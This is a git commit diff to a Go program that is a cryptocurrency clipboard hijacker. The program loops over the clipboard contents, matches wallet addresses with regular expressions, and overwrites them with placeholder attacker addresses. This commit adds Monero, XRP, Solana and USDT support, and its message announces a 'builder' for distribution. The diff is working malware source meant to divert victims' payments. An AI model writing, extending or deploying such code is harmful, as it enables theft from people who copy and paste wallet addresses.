a338bc44880416343d525b7f7515b47292809b7a
plainrocky7 <Plainrocky6@proton.me>
2025-08-28 18:39:40 +0100

    Add more crypto currency support.
    Builder coming soon!!!

--- main.go
+++ main.go
@@ -21,6 +21,10 @@ const (
 	BTC      = "insert btc here"
 	ETH      = "insert eth here"
 	LTC      = "instert ltc here"
+	XMR      = "insert monero here"
+	USDT     = "insert usdt"
+	SOL      = "insert sol"
+	XRP      = "insert xrp"
 )
 
 func main() {
@@ -41,6 +45,10 @@ func clip() {
 	ethregexp := regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
 	btcregexp := regexp.MustCompile(`^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$`)
 	btcb32regexp := regexp.MustCompile(`^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`)
+	xmrregexp := regexp.MustCompile(`\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93,105}\b`)
+	xrpregexp := regexp.MustCompile(`\br[1-9A-HJ-NP-Za-km-z]{24,34}\b`)
+	solregexp := regexp.MustCompile(`\b[1-9A-HJ-NP-Za-km-z]{32,44}\b`)
+	usdt := regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`)
 
 	for {
 
@@ -58,6 +66,18 @@ func clip() {
 		} else if ltcregexp.MatchString(getclipboard) {
 			fmt.Println("LTC DETECTED")
 			clipboard.WriteAll(LTC)
+		} else if xmrregexp.MatchString(getclipboard) {
+			fmt.Println("monero detected")
+			clipboard.WriteAll(XMR)
+		} else if xrpregexp.MatchString(getclipboard) {
+			fmt.Println("xrp detected")
+			clipboard.WriteAll(XRP)
+		} else if solregexp.MatchString(getclipboard) {
+			fmt.Println("solana detected")
+			clipboard.WriteAll(SOL)
+		} else if usdt.MatchString(getclipboard) {
+			fmt.Println("usdt detected")
+			clipboard.WriteAll(USDT)
 		}
 
 	}
